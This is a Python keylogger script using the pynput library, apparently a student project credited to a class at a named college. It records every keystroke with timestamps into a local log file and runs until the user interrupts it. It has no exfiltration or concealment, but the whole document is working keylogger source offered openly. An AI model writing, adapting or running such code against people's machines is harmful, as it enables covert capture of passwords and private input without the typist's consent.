#!/usr/bin/env python3
# keylogger_pynput.py - No root required

from pynput import keyboard
import time
import os
import sys
from datetime import datetime

def check_venv():
    """Check if running in virtual environment"""
    if not hasattr(sys, 'real_prefix') and not (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
        print("ERROR: Please run this script in the virtual environment!")
        print("Activate with: source keylogger_venv/bin/activate")
        sys.exit(1)

class Keylogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.listener = None
        self.running = False
        
    def on_press(self, key):
        """Callback function for key presses"""
        try:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                # Try to get the character representation
                char = key.char
            except AttributeError:
                # Handle special keys
                char = f"[{str(key).replace('Key.', '')}]"
            
            # Write to log file
            with open(self.log_file, "a") as f:
                f.write(f"{current_time} - {char}\n")
                
        except Exception as e:
            print(f"Error: {e}")

    def start(self):
        """Start the keylogger"""
        if self.running:
            print("Keylogger is already running!")
            return
            
        print()
        print()
        print("Current State: Active")
        print(f"Log File: {os.path.abspath(self.log_file)}")
        print("Press Ctrl+C to Stop")
        
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        # Keep the program running
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the keylogger"""
        if not self.running:
            return
            
        if self.listener:
            self.listener.stop()
        
        self.running = False
        print("\nKeylogger stopped")
        print(f"Keystrokes recorded in: {self.log_file}")

if __name__ == "__main__":
    print("             _   _            _      ")
    print("            | | (_)          (_)     ")
    print("   ___ _   _| |_ _  ___ _ __  _  ___ ")
    print("  / __| | | | __| |/ _ \\ '_ \\| |/ _ \\")
    print(" | (__| |_| | |_| |  __/ |_) | |  __/")
    print("  \\___|\\__,_|\\__|_|\\___| .__/|_|\\___|")
    print("                       | |           ")
    print("                       |_|           ")
    print("                 Developed by: BSIT 3H STUDENTS")
    print("                 School: Camarines Sur Polytechinic Colleges")
    
    # Check virtual environment
    check_venv()
    
    keylogger = Keylogger()
    
    try:
        keylogger.start()
    except Exception as e:
        print(f"Error: {e}")
        keylogger.stop()
